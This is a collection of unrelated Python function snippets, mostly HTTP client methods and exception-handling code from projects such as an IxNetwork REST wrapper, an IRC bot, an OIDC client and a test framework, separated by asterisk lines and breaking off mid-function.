        """
        rospy.loginfo('Amazon Polly Request: {}'.format(request))

        try:
            response = self._dispatch(request)
            rospy.loginfo('will return {}'.format(response))
            return PollyResponse(result=response)
        except Exception as e:
            current_dir = os.path.dirname(os.path.abspath(__file__))
            exc_type = sys.exc_info()[0]

            # not using `issubclass(exc_type, ConnectionError)` for the condition below because some versions
            # of urllib3 raises exception when doing `from requests.exceptions import ConnectionError`
            error_ogg_filename = 'connerror.ogg' if 'ConnectionError' in exc_type.__name__ else 'error.ogg'

            error_details = {
                'Audio File': os.path.join(current_dir, 'data', error_ogg_filename),
                'Audio Type': 'ogg',
                'Exception': {
                    'Type': str(exc_type),
                    'Module': exc_type.__module__,
                    'Name': exc_type.__name__,
                    'Value': str(e),
                },
                'Traceback': traceback.format_exc()
            }

            error_str = json.dumps(error_details)
            rospy.logerr(error_str)
            return PollyResponse(result=error_str) 
**************************************
def _raise_for_status(self, response, explanation=None):
        """Raises stored :class:`APIError`, if one occurred."""
        try:
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 404:
                raise errors.NotFound(e, response, explanation=explanation)
            raise errors.APIError(e, response, explanation=explanation) 
**************************************
def get(self, restApi, data={}, stream=False, silentMode=False, ignoreError=False):
        """
        Description
           A HTTP GET function to send REST APIs.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
           ignoreError: True or False.  If False, the response will be returned.
        """
        if silentMode is False:
            print('\nGET:', restApi)
            print('HEADERS:', self.jsonHeader)

        try:
            response = requests.get(restApi, headers=self.jsonHeader)

            if silentMode is False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if ignoreError == False:
                    raise IxNetRestApiException('http GET error:{0}\n'.format(response.text))
            return response

        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http GET error: {0}\n'.format(errMsg)) 
**************************************
def post(self, restApi, data={}, headers=None, silentMode=False, ignoreError=False):
        """
        Description
           A HTTP POST function to mainly used to create or start operations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           headers: The special header to use for the URL.
           silentMode: True or False.  To display URL, data and header info.
           noDataJsonDumps: True or False. If True, use json dumps. Else, accept the data as-is. 
           ignoreError: True or False.  If False, the response will be returned. No exception will be raised.
        """

        if headers != None:
            originalJsonHeader = self.jsonHeader
            self.jsonHeader = headers

        data = json.dumps(data)

        print('\nPOST:', restApi)
        if silentMode == False:
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)

        try:
            response = requests.post(restApi, data=data, headers=self.jsonHeader)
            # 200 or 201
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if ignoreError == False:
                    raise IxNetRestApiException('http POST error: {0}\n'.format(response.text))

            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http POST error: {0}\n'.format(errMsg)) 
**************************************
def delete(self, restApi, data={}, headers=None):
        """
        Description
           A HTTP DELETE function to delete the session.
           For Linux API server only.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           headers: The header to use for the URL.
        """

        if headers != None:
            self.jsonHeader = headers

        print('\nDELETE:', restApi)
        print('DATA:', data)
        print('HEADERS:', self.jsonHeader)
        try:
            response = requests.delete(restApi, data=json.dumps(data), headers=self.jsonHeader)
            print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                raise IxNetRestApiException('http DELETE error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http DELETE error: {0}\n'.format(errMsg)) 
**************************************
def get(self, restApi, data={}, stream=False, silentMode=False, ignoreError=False):
        """
        Description
           A HTTP GET function to send REST APIs.

        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
           ignoreError: True or False.  If False, the response will be returned.
        """
        if silentMode is False or self.generateRestLogFile is True:
            #print('\nGET:', restApi)
            #print('HEADERS:', self.jsonHeader)
            self.logInfo('\nGET: {0}'.format(restApi))
            self.logInfo('HEADERS: {0}'.format(self.jsonHeader))

        try:
            # For binary file
            if stream:
                response = requests.get(restApi, stream=True, headers=self.jsonHeader, verify=self.verifySslCert)
            if stream == False:
                response = requests.get(restApi, headers=self.jsonHeader, verify=self.verifySslCert)

            if silentMode is False:
                self.logInfo('STATUS CODE: {0}'.format(response.status_code))
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if ignoreError == False:
                    if 'message' in response.json() and response.json()['messsage'] != None:
                        self.logWarning('\n%s' % response.json()['message'])
                    raise IxNetRestApiException('GET error:{0}\n'.format(response.text))
            return response

        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('GET error: {0}\n'.format(errMsg)) 
**************************************
def patch(self, restApi, data={}, silentMode=False):
        """
        Description
           A HTTP PATCH function to modify configurations.

        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
        """

        if silentMode == False:
            self.logInfo('\nPATCH: %s' % restApi)
            self.logInfo('DATA: %s' % data)
            self.logInfo('HEADERS: %s' % self.jsonHeader)

        try:
            response = requests.patch(restApi, data=json.dumps(data), headers=self.jsonHeader, verify=self.verifySslCert)
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if 'message' in response.json() and response.json()['messsage'] != None:
                    self.logWarning('\n%s' % response.json()['message'])
                self.showErrorMessage()
                raise IxNetRestApiException('PATCH error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('PATCH error: {0}\n'.format(errMsg)) 
**************************************
def delete(self, restApi, data={}, headers=None):
        """
        Description
           A HTTP DELETE function to delete the session.
           For Linux API server only.

        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           headers: The header to use for the URL.
        """

        if headers != None:
            self.jsonHeader = headers

        self.logInfo('\nDELETE: %s' % restApi)
        self.logInfo('DATA: %s' % data)
        self.logInfo('HEADERS: %s' % self.jsonHeader)
        try:
            response = requests.delete(restApi, data=json.dumps(data), headers=self.jsonHeader, verify=self.verifySslCert)
            print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                self.showErrorMessage()
                raise IxNetRestApiException('DELETE error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('DELETE error: {0}\n'.format(errMsg)) 
**************************************
def get(self, restApi, data={}, stream=False, silentMode=False, ignoreError=False):
        """
        Description
           A HTTP GET function to send REST APIs.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
           ignoreError: True or False.  If False, the response will be returned.
        """
        if silentMode is False:
            print('\nGET:', restApi)
            print('HEADERS:', self.jsonHeader)

        try:
            response = requests.get(restApi, headers=self.jsonHeader)

            if silentMode is False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if ignoreError == False:
                    raise IxNetRestApiException('http GET error:{0}\n'.format(response.text))
            return response

        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http GET error: {0}\n'.format(errMsg)) 
**************************************
def post(self, restApi, data={}, headers=None, silentMode=False, ignoreError=False):
        """
        Description
           A HTTP POST function to mainly used to create or start operations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           headers: The special header to use for the URL.
           silentMode: True or False.  To display URL, data and header info.
           noDataJsonDumps: True or False. If True, use json dumps. Else, accept the data as-is. 
           ignoreError: True or False.  If False, the response will be returned. No exception will be raised.
        """

        if headers != None:
            originalJsonHeader = self.jsonHeader
            self.jsonHeader = headers

        data = json.dumps(data)

        print('\nPOST:', restApi)
        if silentMode == False:
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)

        try:
            response = requests.post(restApi, data=data, headers=self.jsonHeader)
            # 200 or 201
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if ignoreError == False:
                    raise IxNetRestApiException('http POST error: {0}\n'.format(response.text))

            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http POST error: {0}\n'.format(errMsg)) 
**************************************
def get(self, restApi, data={}, stream=False, silentMode=False, ignoreError=False):
        """
        Description
           A HTTP GET function to send REST APIs.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
           ignoreError: True or False.  If False, the response will be returned.
        """
        if silentMode is False:
            print('\nGET:', restApi)
            print('HEADERS:', self.jsonHeader)

        try:
            response = requests.get(restApi, headers=self.jsonHeader)

            if silentMode is False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if ignoreError == False:
                    raise IxNetRestApiException('http GET error:{0}\n'.format(response.text))
            return response

        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http GET error: {0}\n'.format(errMsg)) 
**************************************
def post(self, restApi, data={}, headers=None, silentMode=False, ignoreError=False):
        """
        Description
           A HTTP POST function to mainly used to create or start operations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           headers: The special header to use for the URL.
           silentMode: True or False.  To display URL, data and header info.
           noDataJsonDumps: True or False. If True, use json dumps. Else, accept the data as-is. 
           ignoreError: True or False.  If False, the response will be returned. No exception will be raised.
        """

        if headers != None:
            originalJsonHeader = self.jsonHeader
            self.jsonHeader = headers

        data = json.dumps(data)

        print('\nPOST:', restApi)
        if silentMode == False:
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)

        try:
            response = requests.post(restApi, data=data, headers=self.jsonHeader)
            # 200 or 201
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if ignoreError == False:
                    raise IxNetRestApiException('http POST error: {0}\n'.format(response.text))

            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http POST error: {0}\n'.format(errMsg)) 
**************************************
def delete(self, restApi, data={}, headers=None):
        """
        Description
           A HTTP DELETE function to delete the session.
           For Linux API server only.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           headers: The header to use for the URL.
        """

        if headers != None:
            self.jsonHeader = headers

        print('\nDELETE:', restApi)
        print('DATA:', data)
        print('HEADERS:', self.jsonHeader)
        try:
            response = requests.delete(restApi, data=json.dumps(data), headers=self.jsonHeader)
            print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                raise IxNetRestApiException('http DELETE error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http DELETE error: {0}\n'.format(errMsg)) 
**************************************
def get(self, restApi, data={}, stream=False, silentMode=False, ignoreError=False):
        """
        Description
           A HTTP GET function to send REST APIs.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
           ignoreError: True or False.  If False, the response will be returned.
        """
        if silentMode is False:
            print('\nGET:', restApi)
            print('HEADERS:', self.jsonHeader)

        try:
            response = requests.get(restApi, headers=self.jsonHeader)

            if silentMode is False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if ignoreError == False:
                    raise IxNetRestApiException('http GET error:{0}\n'.format(response.text))
            return response

        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http GET error: {0}\n'.format(errMsg)) 
**************************************
def post(self, restApi, data={}, headers=None, silentMode=False, ignoreError=False):
        """
        Description
           A HTTP POST function to mainly used to create or start operations.
        
        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           headers: The special header to use for the URL.
           silentMode: True or False.  To display URL, data and header info.
           noDataJsonDumps: True or False. If True, use json dumps. Else, accept the data as-is. 
           ignoreError: True or False.  If False, the response will be returned. No exception will be raised.
        """

        if headers != None:
            originalJsonHeader = self.jsonHeader
            self.jsonHeader = headers

        data = json.dumps(data)

        print('\nPOST:', restApi)
        if silentMode == False:
            print('DATA:', data)
            print('HEADERS:', self.jsonHeader)

        try:
            response = requests.post(restApi, data=data, headers=self.jsonHeader)
            # 200 or 201
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if ignoreError == False:
                    raise IxNetRestApiException('http POST error: {0}\n'.format(response.text))

            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('http POST error: {0}\n'.format(errMsg)) 
**************************************
def _handle_error_response(self, response):
        # TODO replace this with `_raise_api_error`
        if response.status_code == 502:
            from requests.exceptions import ProxyError
            raise ProxyError("The proxy returned an error, this could be due to a timeout.")
        else:
            message = None
            if response.headers['Content-Type'] == 'application/json':
                message = response.json().get('message', None)
            if message:
                message = response.text

            raise ConnectionAbortedError(message) 
**************************************
def isup(text):
    """<url> - uses isup.me to check if <url> is online or offline
    :type text: str
    """
    url = text.strip()

    # slightly overcomplicated, esoteric URL parsing
    scheme, auth, path, query, fragment = urllib.parse.urlsplit(url)

    domain = auth or path

    try:
        response = requests.get('http://isup.me/' + domain)
    except requests.exceptions.ConnectionError:
        return "Failed to get status."
    if response.status_code != requests.codes.ok:
        return "Failed to get status."

    soup = BeautifulSoup(response.text, 'lxml')

    content = soup.find('div').text.strip()

    if "not just you" in content:
        return "It's not just you. {} looks \x02\x034down\x02\x0f from here!".format(url)
    elif "is up" in content:
        return "It's just you. {} is \x02\x033up\x02\x0f.".format(url)
    else:
        return "Huh? That doesn't look like a site on the interweb." 
**************************************
def fishbans(text, bot):
    """<user> - gets information on <user>'s minecraft bans from fishbans"""
    user = text.strip()
    headers = {'User-Agent': bot.user_agent}

    try:
        request = requests.get(api_url.format(quote_plus(user)), headers=headers)
        request.raise_for_status()
    except (requests.exceptions.HTTPError, requests.exceptions.ConnectionError) as e:
        return "Could not fetch ban data from the Fishbans API: {}".format(e)

    try:
        json = request.json()
    except ValueError:
        return "Could not fetch ban data from the Fishbans API: Invalid Response"

    if not json["success"]:
        return "Could not fetch ban data for {}.".format(user)

    user_url = "http://fishbans.com/u/{}/".format(user)
    ban_count = json["stats"]["totalbans"]

    if ban_count == 1:
        return "The user \x02{}\x02 has \x021\x02 ban - {}".format(user, user_url)
    elif ban_count > 1:
        return "The user \x02{}\x02 has \x02{}\x02 bans - {}".format(user, ban_count, user_url)
    else:
        return "The user \x02{}\x02 has no bans - {}".format(user, user_url) 
**************************************
def bancount(text, bot):
    """<user> - gets a count of <user>'s minecraft bans from fishbans"""
    user = text.strip()
    headers = {'User-Agent': bot.user_agent}

    try:
        request = requests.get(api_url.format(quote_plus(user)), headers=headers)
        request.raise_for_status()
    except (requests.exceptions.HTTPError, requests.exceptions.ConnectionError) as e:
        return "Could not fetch ban data from the Fishbans API: {}".format(e)

    try:
        json = request.json()
    except ValueError:
        return "Could not fetch ban data from the Fishbans API: Invalid Response"

    if not json["success"]:
        return "Could not fetch ban data for {}.".format(user)

    user_url = "http://fishbans.com/u/{}/".format(user)
    services = json["stats"]["service"]

    out = []
    for service, ban_count in list(services.items()):
        if ban_count != 0:
            out.append("{}: \x02{}\x02".format(service, ban_count))
        else:
            pass

    if not out:
        return "The user \x02{}\x02 has no bans - {}".format(user, user_url)
    else:
        return "Bans for \x02{}\x02: {} - {}".format(user, formatting.get_text_list(out, "and"), user_url) 
**************************************
def test_handle_http_errors():
    """Test pycosio.http._handle_http_errors"""
    from pycosio.storage.http import _handle_http_errors
    from pycosio._core.exceptions import (
        ObjectNotFoundError, ObjectPermissionError)

    # Mocks response
    class Response:
        """Dummy response"""
        status_code = 200
        reason = 'reason'
        raised = False

        def raise_for_status(self):
            """Do nothing"""
            self.raised = True

    response = Response()

    # No error
    assert _handle_http_errors(response) is response

    # 403 error
    response.status_code = 403
    with pytest.raises(ObjectPermissionError):
        _handle_http_errors(response)

    # 404 error
    response.status_code = 404
    with pytest.raises(ObjectNotFoundError):
        _handle_http_errors(response)

    # Any error
    response.status_code = 500
    assert not response.raised
    _handle_http_errors(response)
    assert response.raised 
**************************************
def __call__(self, url, method='GET', body=None, headers=None,
                 timeout=None, **kwargs):
        """Make an HTTP request using requests.

        Args:
            url (str): The URI to be requested.
            method (str): The HTTP method to use for the request. Defaults
                to 'GET'.
            body (bytes): The payload / body in HTTP request.
            headers (Mapping[str, str]): Request headers.
            timeout (Optional[int]): The number of seconds to wait for a
                response from the server. If not specified or if None, the
                requests default timeout will be used.
            kwargs: Additional arguments passed through to the underlying
                requests :meth:`~requests.Session.request` method.

        Returns:
            google.auth.transport.Response: The HTTP response.

        Raises:
            google.auth.exceptions.TransportError: If any exception occurred.
        """
        try:
            _LOGGER.debug('Making request: %s %s', method, url)
            response = self.session.request(
                method, url, data=body, headers=headers, timeout=timeout,
                **kwargs)
            return _Response(response)
        except requests.exceptions.RequestException as caught_exc:
            new_exc = exceptions.TransportError(caught_exc)
            six.raise_from(new_exc, caught_exc) 
**************************************
def wait(self, regex_or_str, timeout = None, console = None):
        """
        Wait for a particular regex/string to be received on a given
        console of this target before a given timeout.

        See :py:meth:`expect` for a version that just raises
        exceptions when the output is not received.

        :param int timeout: Seconds to wait for regex_or_str to be
          received, raise :py:exc:`tcfl.tc.error_e`
          otherwise. If *False*, no timeout check is done; if *None*,
          it is taken from the default timeout set by the testcase.

        :param str console: (optional) name of console from which to
           receive the data

        :returns: *True* if the output was received before the
          timeout, *False* otherwise.
        """
        if timeout:
            assert isinstance(timeout, int)
        console = self.console._console_get(console)

        try:
            with self.on_console_rx_cm(regex_or_str, timeout = timeout,
                                       console = console, result = "pass"):
                # Run the expect loop
                self.testcase.tls.expecter.run()
        except pass_e:
            return True
        except error_e:
            return False 
**************************************
def from_exception(fn):
        """
        Call a phase function to translate exceptions into
        :class:`tcfl.tc.result_c` return codes.


        Passes through the return code, unless it is None, in which
        case we just return result_c(1, 0, 0, 0, 0)

        Note this function prints some more extra detail in case of
        fail/block/skip.
        it.
        """
        def _decorated_fn(*args, **kwargs):

            _tc = args[0] # The `self`  argument to the test case
            try:
                r = fn(*args, **kwargs)
                if r == None:
                    return result_c(1, 0, 0, 0, 0)
                else:
                    return r
            # Some exceptions that are common and we know about, so we
            # can print some more info that will be helpful
            except subprocess.CalledProcessError as e:
                return result_c.from_exception_cpe(_tc, e)
            except OSError as e:
                attachments = dict(
                    errno = e.errno,
                    strerror = e.strerror
                )
                if e.filename:
                    attachments['filename'] = e.filename
                return result_c.report_from_exception(_tc, e, attachments)
            except Exception as e:
                return result_c.report_from_exception(_tc, e)

        return _decorated_fn 
**************************************
def wait(self, regex_or_str, timeout = None, console = None):
        """
        Wait for a particular regex/string to be received on a given
        console of this target before a given timeout.

        See :py:meth:`expect` for a version that just raises
        exceptions when the output is not received.

        :param int timeout: Seconds to wait for regex_or_str to be
          received, raise :py:exc:`tcfl.tc.error_e`
          otherwise. If *False*, no timeout check is done; if *None*,
          it is taken from the default timeout set by the testcase.

        :param str console: (optional) name of console from which to
           receive the data

        :returns: *True* if the output was received before the
          timeout, *False* otherwise.
        """
        if timeout:
            assert isinstance(timeout, int)
        console = self.console._console_get(console)

        try:
            with self.on_console_rx_cm(regex_or_str, timeout = timeout,
                                       console = console, result = "pass"):
                # Run the expect loop
                self.testcase.tls.expecter.run()
        except pass_e:
            return True
        except error_e:
            return False 
**************************************
def status(cls, config, to_screen=True):
        status = {}
        rendered = None
        api_addr = config['api']['bind_host']
        api_port = config['api']['port']

        target = 'http://{host}:{port}/status'.format(host=api_addr, port=api_port)
        try:
            r = requests.get(target, timeout=cls.STATUS_TIMEOUT)
            r.raise_for_status()

            status = r.json()
        except requests.exceptions.HTTPError as e:
            log.error("HTTP error collecting agent status: %s", e)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            log.error("Problem connecting or connection timed out, is the agent up? Error: %s", e)
        except ValueError as e:
            log.error("There was a problem unmarshaling JSON response: %s", e)

        if status:
            here = os.path.dirname(os.path.realpath(__file__))
            templates = os.path.join(here, 'templates')
            template_env = Environment(loader=FileSystemLoader(templates))
            template = template_env.get_template('status.jinja')
            rendered = template.render(version=AGENT_VERSION, status=status)
            if to_screen:
                print(rendered)

        return rendered 
**************************************
def _getJsonWithRetry(self, url):
        """Private method to wrap getting json data with retries. Only gets single page, nothing fancy. See getJson
        :param url: url to get
        :return: json data returned from server
        """
        retry_count = 0
        req = None
        while retry_count < self._max_retries:
            try:
                #val = 'Token ' + self._token
                headers = {'Authorization': 'Token ' + self._token} 
                req = requests.get(url, timeout=self._req_timeout, headers=headers)
                if req.status_code == requests.codes.ok:
                    break
                logging.warning('Failed to get %s, status %d, retry %d' % (url, req.status_code, retry_count))
            except requests.exceptions.RequestException as e:
                logging.warning('Failed to get request for %s, RequestException: %s' % (url, e))
                pass        # Just pass it, we will include it as a retry ahead
            finally:
                retry_count += 1

        if retry_count >= self._max_retries:
            logging.error("Exceeded max connection retries for %s" % url)
            if req is not None:
                logging.error("Request failure reason: %s" % req.reason)
                raise ConnectionError(req.reason)
            else:
                logging.error("No request, no reason!")
                raise ConnectionError

        return req.json()

    # TODO check documentation 
**************************************
def download(self, url):
        from os.path import abspath, join
        from genericpath import exists

        from rowgenerators.appurl.url import Url
        from rowgenerators.exceptions import DownloadError, AccessError

        # logger.debug(f"Download {url}")

        working_dir = self.working_dir if self.working_dir else ''

        r = Resource()

        # For local files, don't download, just reference in place.
        if url.scheme == 'file':
            r.cache_path = Url(url.resource_url).path
            r.download_time = None

            # Many places the file may exist
            locations = {  # What a mess ...
                abspath(r.cache_path),
                abspath(r.cache_path.lstrip('/')),
                abspath(join(working_dir, r.cache_path)),
                abspath(r.cache_path.lstrip('/'))
            }

            for l in locations:
                if exists(l):
                    r.sys_path = l
                    logger.debug("Found '{}'as local file '{}'".format(str(url), l))
                    break
            else:
                raise DownloadError(("File resource does not exist. Found none of:"
                                     "\n{}\n\nWorking dir = {}\ncache_path={}\nspec_path={}")
                                    .format('\n'.join(locations), working_dir, r.cache_path, url.path))

        else:
            # Not a local file, so actually need to download it.
            try:
                r.cache_path, r.download_time = self._download_with_lock(url.resource_url)
            except AccessError as e:
                # Try again, using a URL that we may have configured an account for. This is
                # primarily S3 urls, with Boto or AWS credential
                try:
                    r.cache_path, r.download_time = self._download_with_lock(url.auth_resource_url)
                except AttributeError as e:
                    raise e
                except DownloadError as e:
                    raise DownloadError("Access error for url '{}'; also tried accessing as S3 url '{}'".format(url, url.auth_resource_url ))

            r.sys_path = self.cache.getsyspath(r.cache_path)

        return r 
**************************************
def refresh_token(self, request):
        """ Refreshes the token of the current user. """
        # NOTE: no refresh token in the session means that the user wasn't authentified using the
        # OpenID Connect provider (OP).
        refresh_token = request.session.get('oidc_auth_refresh_token')
        if refresh_token is None:
            return

        id_token_exp_timestamp = request.session.get('oidc_auth_id_token_exp_timestamp', None)
        now_timestamp = time.time()
        # Returns immediatelly if the token is still valid.
        if id_token_exp_timestamp is not None and id_token_exp_timestamp > now_timestamp:
            return

        # Prepares the token payload that will be used to request a new token from the token
        # endpoint.
        refresh_token = request.session.pop('oidc_auth_refresh_token')
        token_payload = {
            'client_id': oidc_rp_settings.CLIENT_ID,
            'client_secret': oidc_rp_settings.CLIENT_SECRET,
            'grant_type': 'refresh_token',
            'refresh_token': refresh_token,
        }

        # Calls the token endpoint.
        token_response = requests.post(oidc_rp_settings.PROVIDER_TOKEN_ENDPOINT, data=token_payload)
        try:
            token_response.raise_for_status()
        except requests.exceptions.HTTPError:
            auth.logout(request)
            return
        token_response_data = token_response.json()

        # Validates the token.
        raw_id_token = token_response_data.get('id_token')
        id_token = validate_and_return_id_token(raw_id_token, validate_nonce=False)

        # If the token cannot be validated we have to log out the current user.
        if id_token is None:
            auth.logout(request)
            return

        # Retrieves the access token and refresh token.
        access_token = token_response_data.get('access_token')
        refresh_token = token_response_data.get('refresh_token')

        # Stores the ID token, the related access token and the refresh token in the session.
        request.session['oidc_auth_id_token'] = raw_id_token
        request.session['oidc_auth_access_token'] = access_token
        request.session['oidc_auth_refresh_token'] = refresh_token

        # Saves the new expiration timestamp.
        request.session['oidc_auth_id_token_exp_timestamp'] = \
            time.time() + oidc_rp_settings.ID_TOKEN_MAX_AGE 
**************************************
def get(self, restApi, data={}, stream=False, silentMode=False, ignoreError=False, maxRetries=5):
        """
        Description
            A HTTP GET function to send REST APIs.

        Parameters
           restApi: (str): The REST API URL.
           data: (dict): The data payload for the URL.
           silentMode: (bool):  To display on stdout: URL, data and header info.
           ignoreError: (bool): True: Don't raise an exception.  False: The response will be returned.
           maxRetries: <int>: The maximum amount of GET retries before declaring as server connection failure.

        Syntax
            /api/v1/sessions/1/ixnetwork/operations
        """
        retryInterval = 3
        restExecutionFailures = 0
        while True:
            if silentMode is False:
                self.logInfo('\n\tGET: {0}'.format(restApi))

            try:
                # For binary file
                if stream:
                    response = self._session.request('GET', restApi, stream=True, headers=self.jsonHeader, allow_redirects=True, verify=self.verifySslCert)

                if stream == False:
                    response = self._session.request('GET', restApi, headers=self.jsonHeader, allow_redirects=True, verify=self.verifySslCert)

                if silentMode is False:
                    for redirectStatus in response.history:
                        if '307' in str(response.history):
                            self.logInfo('\t{0}: {1}'.format(redirectStatus, response.url), timestamp=False)

                    self.logInfo('\tSTATUS CODE: {0}'.format(response.status_code), timestamp=False)

                if not str(response.status_code).startswith('2'):
                    if ignoreError == False:
                        if 'message' in response.json() and response.json()['messsage'] != None:
                            self.logWarning('\n%s' % response.json()['message'])

                        errMsg = 'GET Exception error: {0}'.format(response.text)
                        raise IxNetRestApiException(errMsg)

                return response

            except (requests.exceptions.RequestException, Exception) as errMsg:
                errMsg = 'GET Exception error {]/{} retries: {}'.format(restExecutionFailures, maxRetries, errMsg)

                if restExecutionFailures < maxRetries:
                    self.logError(errMsg)
                    restExecutionFailures += 1
                    time.sleep(retryInterval)
                    continue
                
                if restExecutionFailures == maxRetries:
                    raise IxNetRestApiException(errMsg) 
**************************************
def options(self, restApi, data={}, silentMode=False, ignoreError=False, maxRetries=5):
        """
        Description
            A HTTP OPTIONS function to send REST APIs.

        Parameters
           restApi: (str): The REST API URL.
           silentMode: (bool):  To display on stdout: URL, data and header info.
           ignoreError: (bool): True: Don't raise an exception.  False: The response will be returned.
           maxRetries: <int>: The maximum amount of GET retries before declaring as server connection failu
        """
        retryInterval = 3
        restExecutionFailures = 0
        while True:
            if silentMode is False:
                self.logInfo('\n\tOPTIONS: {0}'.format(restApi))

            try:
                # For binary file
                response = self._session.request('OPTIONS', restApi, headers=self.jsonHeader, allow_redirects=True, verify=self.verifySslCert)

                if silentMode is False:
                    for redirectStatus in response.history:
                        if '307' in str(response.history):
                            self.logInfo('\t{0}: {1}'.format(redirectStatus, response.url), timestamp=False)

                    self.logInfo('\tSTATUS CODE: {0}'.format(response.status_code), timestamp=False)

                if not str(response.status_code).startswith('2'):
                    if ignoreError == False:
                        if 'message' in response.json() and response.json()['messsage'] != None:
                            self.logWarning('\n%s' % response.json()['message'])

                        errMsg = 'OPTIONS Exception error: {0}'.format(response.text)
                        raise IxNetRestApiException(errMsg)
                return response

            except (requests.exceptions.RequestException, Exception) as errMsg:
                errMsg = 'OPTIONS Exception error {}/{} retries: {}'.format(restExecutionFailures, maxRetries, errMsg)

                if restExecutionFailures < maxRetries:
                    self.logError(errMsg)
                    restExecutionFailures += 1
                    time.sleep(retryInterval)
                    continue
                
                if restExecutionFailures == maxRetries:
                    raise IxNetRestApiException(errMsg) 
**************************************
def delete(self, restApi, data={}, headers=None, maxRetries=5):
        """
        Description
           A HTTP DELETE function to delete the session.
           For Linux and Windows Connection Mgr API server only.

        Paramters
           restApi: (str): The REST API URL.
           data: (dict): The data payload for the URL.
           headers: (str): The headers to use for the URL.
           maxRetries: <int>: The maximum amount of GET retries before declaring as server connection failure.
        """
        if headers != None:
            self.jsonHeader = headers
            
        retryInterval = 3
        restExecutionFailures = 0
        while True:
            self.logInfo('\n\tDELETE: {0}\n\tDATA: {1}'.format(restApi, data))

            try:
                response = self._session.request('DELETE', restApi, data=json.dumps(data), headers=self.jsonHeader, allow_redirects=True, 
                                                 verify=self.verifySslCert)

                for redirectStatus in response.history:
                    if '307' in str(response.history):
                        self.logInfo('\t{0}: {1}'.format(redirectStatus, response.url), timestamp=False)

                self.logInfo('\tSTATUS CODE: %s' % response.status_code, timestamp=False)
                if not str(response.status_code).startswith('2'):
                    self.showErrorMessage()
                    errMsg = 'DELETE Exception error: {0}\n'.format(response.text)
                    self.logError(errMsg)
                    raise IxNetRestApiException(errMsg)
                return response

            except (requests.exceptions.RequestException, Exception) as errMsg:
                errMsg = 'DELETE Exception error {}/{} retries: {}\n'.format(restExecutionFailures, maxRetries, errMsg)

                if restExecutionFailures < maxRetries:
                    self.logError(errMsg)
                    restExecutionFailures += 1
                    time.sleep(retryInterval)
                    continue
                
                if restExecutionFailures == maxRetries:
                    raise IxNetRestApiException(errMsg) 
**************************************
def __method_trampoline_call(self, fname, fn, _type, targets):
        # runs a class function and return a return_c
        #
        # convers the return value to return_c from bool, or None, or
        # passes a return_c. Passes exceptions.
        #
        # We use fname instead of fn.__name__ because if we have made
        # an alias out of the method in the class (with setattr(), we
        # want to see the alias name, not the original function name).
        if fname == fn.__name__:
            self.report_info("running %s.%s()"
                             % (type(self).__name__, fn.__name__),
                             dlevel = 3)
        else:
            self.report_info("running %s.%s() [App builder's alias for "
                             "%s() which calls tc_c._*_50_for_target()]"
                             % (type(self).__name__, fname, fn.__name__),
                             dlevel = 3)
        if type(fn) == types.MethodType:	# instance needed
            if fn.im_self == None:
                # This was added from target_wanted_add(), binding to an
